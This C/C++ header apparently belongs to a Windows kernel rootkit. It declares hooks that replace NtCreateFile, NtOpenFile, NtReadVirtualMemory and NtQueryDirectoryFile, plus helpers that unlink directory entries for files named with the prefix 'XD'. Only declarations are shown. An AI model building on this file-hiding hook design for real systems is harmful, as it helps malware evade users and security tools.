#pragma once
#include "hook.hpp"

#define NO_MORE_ENTRIES		0

typedef NTSTATUS(*FNtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
static FNtCreateFile g_NtCreateFile = 0;
typedef NTSTATUS(*FNtOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
static FNtOpenFile g_NtOpenFile = 0;
typedef NTSTATUS(*FNtReadVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, ULONG);
static FNtReadVirtualMemory g_NtReadVirtualMemory = 0;

typedef NTSTATUS(*FNtQueryDirectoryFile)
(
				IN    HANDLE FileHandle,
				IN	HANDLE Event,
				IN	PIO_APC_ROUTINE ApcRoutine,
				IN	PVOID ApcContext,
				OUT   PIO_STATUS_BLOCK IoStatusBlock,
				OUT   PVOID FileInformation,
				IN    ULONG Length,
				IN    FILE_INFORMATION_CLASS FileInformationClass,
				IN    BOOLEAN ReturnSingleEntry,
				IN	PUNICODE_STRING FileName,
				IN    BOOLEAN RestartScan
				);

static FNtQueryDirectoryFile g_NtQueryDirectoryFile = 0, g_ZwQueryDirectoryFile = 0;

typedef NTSTATUS(__stdcall* QUERY_INFO_PROCESS)(
				__in       HANDLE ProcessHandle,
				__in       PROCESSINFOCLASS ProcessInformationClass,
				__out      PVOID ProcessInformation,
				__in       ULONG ProcessInformationLength,
				__out_opt  PULONG ReturnLength
				);

static QUERY_INFO_PROCESS ZwQueryInformationProcess = NULL;
const WCHAR prefix[] = L"XD";
#define PREFIX_SIZE				2

NTSTATUS GetProcessImageName(HANDLE ProcessHandle, PUNICODE_STRING ProcessImageName);
NTSTATUS MyNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
NTSTATUS MyNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions);
NTSTATUS MyNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, ULONG NumberOfBytesReaded);
PVOID getDirEntryFileName
(
				IN PVOID FileInformation,
				IN FILE_INFORMATION_CLASS FileInfoClass
);

ULONG getNextEntryOffset
(
				IN PVOID FileInformation,
				IN FILE_INFORMATION_CLASS FileInfoClass
);

void setNextEntryOffset
(
				IN PVOID FileInformation,
				IN FILE_INFORMATION_CLASS FileInfoClass,
				IN ULONG newValue
);

BOOLEAN checkIfHiddenFile(WCHAR fileName[]);

NTSTATUS MyNtQueryDirectoryFile
(
				IN    HANDLE FileHandle,
				IN	HANDLE Event,
				IN	PIO_APC_ROUTINE ApcRoutine,
				IN	PVOID ApcContext,
				OUT   PIO_STATUS_BLOCK IoStatusBlock,
				OUT   PVOID FileInformation,
				IN    ULONG Length,
				IN    FILE_INFORMATION_CLASS FileInformationClass,
				IN    BOOLEAN ReturnSingleEntry,
				IN	PUNICODE_STRING FileName,
				IN    BOOLEAN RestartScan
);